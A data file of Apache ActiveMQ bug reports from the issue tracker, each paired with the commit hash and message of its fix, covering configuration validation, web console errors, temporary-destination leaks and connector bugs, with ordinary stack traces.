12497106,AMQ-3168,"i'm working on upgrading from AMQ 5.3.0 to 5.4.2. i'd like to keep schema validation enabled, so i'm carefully re-ordering the elements in activemq.xml.
Our configuration uses PropertyPlaceholderConfigurer to insert values into activemq.xml. One of our configured values is of XSD type ""boolean"":

        <managementContext>
            <managementContext createConnector=""${enableJmx}"" connectorPort=""${jmxConnectorPort}""/>
        </managementContext>

 i'm seeing this error in the console when i run ""activemq/bin/activemq-admin start"":

ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.xml.XmlBeanDefinitionStoreException: Line 128 in XML document from class path resource [activemq.xml] is invalid; nested exception is org.xml.sax.SAXParseException: cvc-datatype-valid.1.2.1: '${enableJmx}' is not a valid value for 'boolean'.

Other replacement tokens that precede this in the file don't produce errors, but they're for string or numeric values, not booleans. Issue AMQ-2939 mentions accomodating numeric vbalues in the broker.xsd. It would be very useful to accomodate boolean values as well, for both configurability and backward compatibility with existing configurations.

",c0c92595fd9e5ab8eca74b33e34e066465f8fc6f,"https://issues.apache.org/jira/browse/AMQ-3168 - use boolean editor for createConnector property, to avoid problems with schema validation

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1201662 13f79535-47bb-0310-9956-ffa450edef68"
12497106,AMQ-3168,"i'm working on upgrading from AMQ 5.3.0 to 5.4.2. i'd like to keep schema validation enabled, so i'm carefully re-ordering the elements in activemq.xml.
Our configuration uses PropertyPlaceholderConfigurer to insert values into activemq.xml. One of our configured values is of XSD type ""boolean"":

        <managementContext>
            <managementContext createConnector=""${enableJmx}"" connectorPort=""${jmxConnectorPort}""/>
        </managementContext>

 i'm seeing this error in the console when i run ""activemq/bin/activemq-admin start"":

ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.xml.XmlBeanDefinitionStoreException: Line 128 in XML document from class path resource [activemq.xml] is invalid; nested exception is org.xml.sax.SAXParseException: cvc-datatype-valid.1.2.1: '${enableJmx}' is not a valid value for 'boolean'.

Other replacement tokens that precede this in the file don't produce errors, but they're for string or numeric values, not booleans. Issue AMQ-2939 mentions accomodating numeric vbalues in the broker.xsd. It would be very useful to accomodate boolean values as well, for both configurability and backward compatibility with existing configurations.

",1462fd234c98037992cdb78b77e9ddde808efa83,"https://issues.apache.org/jira/browse/AMQ-3168 - use boolean editor for most used broker service boolean properties

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1201666 13f79535-47bb-0310-9956-ffa450edef68"
12497051,AMQ-3167,"regression in test from https://issues.apache.org/jira/browse/AMQ-2413 required some investigation. Symptom was missing messages, turned out to be in the middle of the sequence. Issue with the priority kahadb cursors and setbatch. Set batch is invoked when the cursor memory is exhausted such that replay from the store can start at the correct point. If a call to setBatch was followed by a call to recover when there was still no memory space available, the cursor could skip the next pending message.",cfdd68c79983eff4ed2b1a8850bb536cf08cefc9,"https://issues.apache.org/jira/browse/AMQ-3167 - add test case from Arthur with thanks.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1069813 13f79535-47bb-0310-9956-ffa450edef68"
12495753,AMQ-3142,"ActiveMQ 5.4.x uses Karaf 2.1.0.

Karaf 2.2.0 will be released soon. A change affects ActiveMQ: a new Felix gogo version.

For instance, if you try to deploy ActiveMQ 5.4.2 on Karaf 2.1.99-SNAPSHOT, you will get an unresolved constraint as the Felix Gogo export package changed.

In preparation for the support of Karaf 2.2.0, I'm gonna submit a patch to update the Import-Package and use the corresponding Gogo version.",0bb98ba03825e7736b0f333a61b280424d204d6c,"https://issues.apache.org/jira/browse/AMQ-3142 - attempt to make it work with both 2.1.x and 2.2.x karaf

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1084635 13f79535-47bb-0310-9956-ffa450edef68"
12495011,AMQ-3125,"The transportConnector settings ""updateClusterFilter"" and ""updateClusterClientsOnRemove"" are not propagated to JMX managed connectors when they are created from the non-JMX managed connectos.  So, even if they are set in the XML, they don't actually work at runtime.",55c3ef9fdab718937d6d1ba9daca4556258599c1,"https://issues.apache.org/jira/browse/AMQ-3125 - updateClusterFilter/ClientsOnRemove broken when running JMX broker, patch applied with thanks

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1057244 13f79535-47bb-0310-9956-ffa450edef68"
12494843,AMQ-3119,"If the proxy connector is connected to the remote broker using failover transport like 

{code}
          <proxyConnector bind=""tcp://localhost:51618"" remote=""failover:(tcp://localhost:61616)"" 
                proxyToLocalBroker=""true""        
          />
{code}

and the connection to the remote broker is stopped and started again, the consumer listening to the proxy port will stop receiving messages.

However, if openwire cache is disabled on the consumer side, everything works as expected

{code}tcp://localhost:51618?wireFormat.cacheEnabled=false{code}",86565eb0e19af8ead04a0fa3a3ae7e99d5eb8fe0,"https://issues.apache.org/jira/browse/AMQ-3119 - proxy connector and failover

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1055873 13f79535-47bb-0310-9956-ffa450edef68"
12494706,AMQ-3115,"I have a project where I'm trying to use a BrokerService with the
DiscardingDLQBrokerPlugin in code, and I don't want/need the log messages
created for the number of discarded messages.

Eg:

broker_serv = new BrokerService();
plugins[] = new BrokerPlugin[1];
ddlq_plugin = new DiscardingDLQBrokerPlugin();
...
ddlq_plugin.setDropAll(true);
ddlq_plugin.setReportInterval(0);
plugins[0] = ddlq_plugin;

broker_serv.setPlugins(plugins);
broker_serv.start();

Yet, in the DiscardingDLQBrokerPlugin the installPlugin() method doesn't
pass its reportInterval to the DiscardingDLQBroker it creates. So the
DiscardingDLQBroker uses its default reportingInterval of 1000, and no
matter what I do with ddlq_plugin.setReportInterval(x) the reporting
interval is always 1000.

see http://activemq.2283324.n4.nabble.com/Bug-with-DiscardingDLQBrokerPlugin-reportInterval-Not-Used-td3174509.html",6c721fcff57a31fd03017e3ad7ac485bced789ef,"resolve: https://issues.apache.org/jira/browse/AMQ-3115

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1055395 13f79535-47bb-0310-9956-ffa450edef68"
12493335,AMQ-3088,"Clicking on the ""Scheduled"" tab of the AMQ Web Console redirects to a page where all the tabs are removed (Home | Queues | Topics | Subscribers | Connections | Scheduled | Send) and the following message is presented:

""Error! Exception occurred while processing this request, check the log for more information!""

It is not intuitive why this is occurring.  From a design approach, I would expect the tabs to remain and a more descriptive error message to be provided, and maybe even a link to related documentation.   I had to do a top-level search to get to this page: http://activemq.apache.org/delay-and-schedule-message-delivery.html.  I assume it's related.

In the log you will find this (as such, I assume the scheduling features aren't being used and the web site isn't gracefully reporting on this):

2010-12-15 10:03:36,069 | WARN  | /admin/scheduled.jsp | org.eclipse.jetty.util.log | qtp27635615-44
javax.el.ELException: java.lang.IllegalArgumentException: Null object name
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:298)
	at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:175)
	at com.sun.el.parser.AstValue.getValue(AstValue.java:138)
	at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206)
	at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:1001)
	at org.apache.jsp.scheduled_jsp._jspx_meth_c_forEach_0(org.apache.jsp.scheduled_jsp:118)
	at org.apache.jsp.scheduled_jsp._jspService(org.apache.jsp.scheduled_jsp:90)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:389)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:527)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1216)
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118)
	at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:421)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:119)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:493)
	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:225)
	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:930)
	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:358)
	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:183)
	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:866)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:117)
	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:445)
	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126)
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:113)
	at org.eclipse.jetty.server.Server.handle(Server.java:351)
	at org.eclipse.jetty.server.HttpConnection.handleRequest(HttpConnection.java:594)
	at org.eclipse.jetty.server.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:1042)
	at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:549)
	at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:211)
	at org.eclipse.jetty.server.HttpConnection.handle(HttpConnection.java:424)
	at org.eclipse.jetty.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:506)
	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:436)
	at java.lang.Thread.run(Thread.java:662)
Caused by: java.lang.IllegalArgumentException: Null object name
	at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:128)
	at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:97)
	at javax.management.MBeanServerInvocationHandler.newProxyInstance(MBeanServerInvocationHandler.java:217)
	at org.apache.activemq.broker.jmx.ManagementContext.newProxyInstance(ManagementContext.java:290)
	at org.apache.activemq.web.LocalBrokerFacade.newProxyInstance(LocalBrokerFacade.java:88)
	at org.apache.activemq.web.BrokerFacadeSupport.getJobScheduler(BrokerFacadeSupport.java:206)
	at org.apache.activemq.web.BrokerFacadeSupport.getScheduledJobs(BrokerFacadeSupport.java:210)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:293)
	... 46 more
2010-12-15 10:05:38,609 | WARN  | /admin/scheduled.jsp | org.eclipse.jetty.util.log | qtp27635615-43
javax.el.ELException: java.lang.IllegalArgumentException: Null object name
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:298)
	at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:175)
	at com.sun.el.parser.AstValue.getValue(AstValue.java:138)
	at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206)
	at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:1001)
	at org.apache.jsp.scheduled_jsp._jspx_meth_c_forEach_0(org.apache.jsp.scheduled_jsp:118)
	at org.apache.jsp.scheduled_jsp._jspService(org.apache.jsp.scheduled_jsp:90)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:389)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:527)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1216)
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118)
	at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:421)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:119)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:493)
	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:225)
	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:930)
	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:358)
	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:183)
	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:866)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:117)
	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:445)
	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126)
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:113)
	at org.eclipse.jetty.server.Server.handle(Server.java:351)
	at org.eclipse.jetty.server.HttpConnection.handleRequest(HttpConnection.java:594)
	at org.eclipse.jetty.server.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:1042)
	at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:549)
	at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:211)
	at org.eclipse.jetty.server.HttpConnection.handle(HttpConnection.java:424)
	at org.eclipse.jetty.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:506)
	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:436)
	at java.lang.Thread.run(Thread.java:662)
Caused by: java.lang.IllegalArgumentException: Null object name
	at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:128)
	at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:97)
	at javax.management.MBeanServerInvocationHandler.newProxyInstance(MBeanServerInvocationHandler.java:217)
	at org.apache.activemq.broker.jmx.ManagementContext.newProxyInstance(ManagementContext.java:290)
	at org.apache.activemq.web.LocalBrokerFacade.newProxyInstance(LocalBrokerFacade.java:88)
	at org.apache.activemq.web.BrokerFacadeSupport.getJobScheduler(BrokerFacadeSupport.java:206)
	at org.apache.activemq.web.BrokerFacadeSupport.getScheduledJobs(BrokerFacadeSupport.java:210)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:293)
	... 46 more
2010-12-15 10:08:20,771 | WARN  | /admin/scheduled.jsp | org.eclipse.jetty.util.log | qtp27635615-43
javax.el.ELException: java.lang.IllegalArgumentException: Null object name
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:298)
	at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:175)
	at com.sun.el.parser.AstValue.getValue(AstValue.java:138)
	at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206)
	at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:1001)
	at org.apache.jsp.scheduled_jsp._jspx_meth_c_forEach_0(org.apache.jsp.scheduled_jsp:118)
	at org.apache.jsp.scheduled_jsp._jspService(org.apache.jsp.scheduled_jsp:90)
	at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:389)
	at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486)
	at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:527)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1216)
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118)
	at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52)
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1187)
	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:421)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:119)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:493)
	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:225)
	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:930)
	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:358)
	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:183)
	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:866)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:117)
	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126)
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:445)
	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:126)
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:113)
	at org.eclipse.jetty.server.Server.handle(Server.java:351)
	at org.eclipse.jetty.server.HttpConnection.handleRequest(HttpConnection.java:594)
	at org.eclipse.jetty.server.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:1042)
	at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:549)
	at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:211)
	at org.eclipse.jetty.server.HttpConnection.handle(HttpConnection.java:424)
	at org.eclipse.jetty.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:506)
	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:436)
	at java.lang.Thread.run(Thread.java:662)
Caused by: java.lang.IllegalArgumentException: Null object name
	at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:128)
	at javax.management.MBeanServerInvocationHandler.<init>(MBeanServerInvocationHandler.java:97)
	at javax.management.MBeanServerInvocationHandler.newProxyInstance(MBeanServerInvocationHandler.java:217)
	at org.apache.activemq.broker.jmx.ManagementContext.newProxyInstance(ManagementContext.java:290)
	at org.apache.activemq.web.LocalBrokerFacade.newProxyInstance(LocalBrokerFacade.java:88)
	at org.apache.activemq.web.BrokerFacadeSupport.getJobScheduler(BrokerFacadeSupport.java:206)
	at org.apache.activemq.web.BrokerFacadeSupport.getScheduledJobs(BrokerFacadeSupport.java:210)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at javax.el.BeanELResolver.getValue(BeanELResolver.java:293)
	... 46 more
",d0a1a001a3bee563e8cf06b4d2b82fc8373617d6,"https://issues.apache.org/jira/browse/AMQ-3088 - scheduled page error when scheduler is off

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1053683 13f79535-47bb-0310-9956-ffa450edef68"
12491859,AMQ-3067,When using ActiveMQBlobMessage the name attribute is not copied when calling copy(...). As the default of activemq is to copy on send it get lost.,78a54c93533dfce355686ece14ddbfd73e230845,"apply patch from https://issues.apache.org/jira/browse/AMQ-3067 with thanks and additional test

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1041351 13f79535-47bb-0310-9956-ffa450edef68"
12483913,AMQ-3056,"2010-11-12 17:46:24,124 | WARN  | Async error occurred: javax.jms.JMSException: Invalid acknowledgment: MessageAck {commandId = 29455, responseRequired = false, ackType = 3, consumerId =ID:X-2506-1289583778418-0:0:1:1, firstMessageId =ID:X-51821-634249796434830099-1:5:1:3:313195, lastMessageId = ID:X-51821-634249796434830099-1:5:1:3:313195, destination = topic://help.Publish.Instance1, transactionId = null, messageCount = 1} | org.apache.activemq.broker.TransportConnection.Service | ActiveMQ Transport: tcp:///Y:2508
javax.jms.JMSException: Invalid acknowledgment: MessageAck {commandId = 29455, responseRequired = false, ackType = 3, consumerId = ID:X-2506-1289583778418-0:0:1:1, firstMessageId = ID:X09-51821-634249796434830099-1:5:1:3:313195, lastMessageId = ID:X09-51821-634249796434830099-1:5:1:3:313195, destination = topic://help.Publish.Instance1, transactionId = null, messageCount = 1}
        at org.apache.activemq.broker.region.TopicSubscription.acknowledge(TopicSubscription.java:286)
        at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:383)
        at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:544)
        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77)
        at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:200)
        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77)
        at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77)
        at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:87)
        at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:469)
        at org.apache.activemq.command.MessageAck.visit(MessageAck.java:214)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:311)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:185)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:228)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:220)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:202)
        at java.lang.Thread.run(Thread.java:619)
",81f3935cf33feeca9e3380bc01f132e2fc45e57b,"resolve: https://issues.apache.org/activemq/browse/AMQ-3056 - do not throw on redelivery ack for a topic

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1039392 13f79535-47bb-0310-9956-ffa450edef68"
12483877,AMQ-3041,When you use Session.createTemporaryQueue(...) you will see that the TemporaryQueue will get added to JMX. Now when you call TemporaryQueue.delete() it will not get delete from JMX. So when you make heavy use of TemporaryQueues you will see that the entries in JMX will get bigger and bigger as they will never get removed on delete. This can lead to an OOM very frequently.,e511e76d4fef5e91fc73f8063bff04844ad4be19,"https://issues.apache.org/jira/browse/AMQ-3041 - unregister mbean for temp dest

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1061296 13f79535-47bb-0310-9956-ffa450edef68"
12483879,AMQ-3038,As TemporaryQueue and TemporaryTopic is bound to the scope of a Connection both should be deleted when the Connection is closed. If that's not done its possible to see a Memory-Leak on heavy usage really soon,4e33fb114bba828af335be3bcf849116dd8587f2,"https://issues.apache.org/jira/browse/AMQ-3038 - delete temp destinations when connection is closed

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1061365 13f79535-47bb-0310-9956-ffa450edef68"
12483874,AMQ-3029,"Unable to browse ActiveMQBlobMessages via JMX

WARN  09:39:13,383 | org.apache.activemq.broker.jmx.DestinationViewMBean | excep
tion browsing destination
javax.management.openmbean.OpenDataException: Cannot create a CompositeData for
type: org.apache.activemq.command.ActiveMQBlobMessage
        at org.apache.activemq.broker.jmx.OpenTypeSupport.convert(OpenTypeSuppor
t.java:481)
        at org.apache.activemq.broker.jmx.DestinationView.browse(DestinationView
.java:157)
        at org.apache.activemq.broker.jmx.DestinationView.browse(DestinationView
.java:138)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.
java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMB
eanIntrospector.java:93)
        at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMB
eanIntrospector.java:27)
        at com.sun.jmx.mbeanserver.MBeanIntrospector.invokeM(MBeanIntrospector.j
ava:208)
        at com.sun.jmx.mbeanserver.PerInterface.invoke(PerInterface.java:120)
        at com.sun.jmx.mbeanserver.MBeanSupport.invoke(MBeanSupport.java:262)
        at javax.management.StandardMBean.invoke(StandardMBean.java:391)
        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.invoke(DefaultM
BeanServerInterceptor.java:836)
        at com.sun.jmx.mbeanserver.JmxMBeanServer.invoke(JmxMBeanServer.java:761
)
        at javax.management.remote.rmi.RMIConnectionImpl.doOperation(RMIConnecti
onImpl.java:1426)
        at javax.management.remote.rmi.RMIConnectionImpl.access$200(RMIConnectio
nImpl.java:72)
        at javax.management.remote.rmi.RMIConnectionImpl$PrivilegedOperation.run
(RMIConnectionImpl.java:1264)
        at javax.management.remote.rmi.RMIConnectionImpl.doPrivilegedOperation(R
MIConnectionImpl.java:1359)
        at javax.management.remote.rmi.RMIConnectionImpl.invoke(RMIConnectionImp
l.java:788)
        at sun.reflect.GeneratedMethodAccessor60.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:305)
        at sun.rmi.transport.Transport$1.run(Transport.java:159)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:155)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:5
35)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTranspor
t.java:790)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport
.java:649)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExec
utor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor
.java:908)
        at java.lang.Thread.run(Thread.java:619)",eb034b4bc9361280993277843bac79acd6c08dec,"applied patch and test from https://issues.apache.org/activemq/browse/AMQ-3029 with thanks

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1035264 13f79535-47bb-0310-9956-ffa450edef68"
12483517,AMQ-3020,<NA>,4f327e091beb0b1aa01060b72bc8f810ae44ab0f,"https://issues.apache.org/activemq/browse/AMQ-3020 - missing properties file

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1032904 13f79535-47bb-0310-9956-ffa450edef68"
12483517,AMQ-3020,<NA>,3e8abcc43f2e2786220a1b1297d05237506af54f,"https://issues.apache.org/activemq/browse/AMQ-3020 - imrpove test timings

